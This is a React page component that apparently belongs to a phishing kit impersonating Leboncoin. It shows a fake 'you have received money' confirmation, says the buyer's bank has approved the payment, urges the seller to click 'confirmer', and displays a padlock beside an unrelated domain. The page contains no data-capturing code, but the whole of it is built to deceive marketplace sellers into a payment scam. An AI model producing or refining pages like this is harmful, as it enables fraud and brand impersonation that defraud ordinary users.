
import React from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { LeboncoinLogo } from '@/components/LeboncoinLogo';
import { Check } from 'lucide-react';
import { ProgressSteps } from '@/components/ProgressSteps';

const steps = [
  { name: 'Confirm', status: 'complete' as const },
  { name: 'Checkpoint', status: 'complete' as const },
  { name: 'Verify', status: 'complete' as const },
  { name: 'Complete', status: 'complete' as const },
];

export default function LeboncoinCompletion() {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen flex flex-col bg-gray-50">
      <header className="bg-white border-b py-4 px-4">
        <div className="container mx-auto flex justify-center">
          <LeboncoinLogo size="lg" />
        </div>
      </header>
      
      <div className="container mx-auto px-4 py-8 flex-1 flex flex-col items-center">
        <div className="w-full max-w-md mb-8">
          <ProgressSteps steps={steps} />
        </div>
        
        <Card className="w-full max-w-md">
          <CardContent className="pt-6">
            <div className="text-center space-y-6">
              <div className="flex justify-center mb-2">
                <div className="h-20 w-20 rounded-full border-4 border-orange-500 flex items-center justify-center">
                  <Check className="h-10 w-10 text-orange-500" />
                </div>
              </div>
              
              <h2 className="text-2xl font-semibold">Vous avez reçu de l'argent !</h2>
              <p className="text-gray-600">
                Ce paiement LeBoncoin a été déduit du compte de l'acheteur et a été « APPROUVÉ » par sa banque.
              </p>
              
              <div className="flex justify-center space-x-3 py-4">
                <div className="w-3 h-3 rounded-full bg-orange-500"></div>
                <div className="w-3 h-3 rounded-full bg-orange-500"></div>
                <div className="w-3 h-3 rounded-full bg-orange-500"></div>
              </div>
              
              <p className="text-gray-700">
                Pour recevoir le paiement sur votre compte, cliquez ici :
              </p>
              
              <Button 
                onClick={() => navigate('/')}
                className="w-full bg-blue-500 hover:bg-blue-600 text-white"
              >
                confirmer
              </Button>
            </div>
          </CardContent>
        </Card>
        
        <div className="mt-8 bg-white p-4 rounded border w-full max-w-md">
          <div className="text-center">
            <p className="text-sm text-gray-500">🔒 jiwled.n0c.world</p>
          </div>
        </div>
      </div>
    </div>
  );
}
